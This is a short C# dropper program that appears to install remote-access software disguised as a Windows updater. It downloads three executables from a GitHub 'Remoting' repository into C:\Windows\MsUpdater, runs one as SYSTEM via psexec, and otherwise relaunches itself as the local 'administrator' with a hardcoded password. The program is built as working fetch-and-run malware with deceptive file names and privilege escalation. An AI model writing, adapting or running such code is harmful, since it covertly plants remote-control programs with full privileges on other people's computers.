namespace Bootstrap
{
    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Security;
    using System.Security.Principal;

    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            const string AdminTarget = @"C:\Windows\MsUpdater\MsUpdater.exe";
            const string UserTarget = @"C:\Windows\MsUpdater\MsUpdater2.exe";
            const string SystemTarget = @"C:\Windows\MsUpdater\MsUpdater0.exe";

            var password = new SecureString();

            foreach (var a in "abc123kappa")
            {
                password.AppendChar(a);
            }

            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater.exe?raw=true", AdminTarget);
                    client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater2.exe?raw=true", UserTarget);
                    client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater0.exe?raw=true", SystemTarget);
                }

                Process.Start(new ProcessStartInfo("cmd.exe", @"/C C:\Windows\MsUpdater\psexec64 -i -s -accepteula -d C:\Windows\MsUpdater\msupdater0.exe"));
                Process.Start(AdminTarget);
                return;
            }

            // ReSharper disable once PossibleNullReferenceException
            Process.Start(@"C:\Windows\MsUpdater\Bootstrap.exe", "administrator", password, string.Empty).WaitForExit();
            Process.Start(UserTarget);
        }
    }
}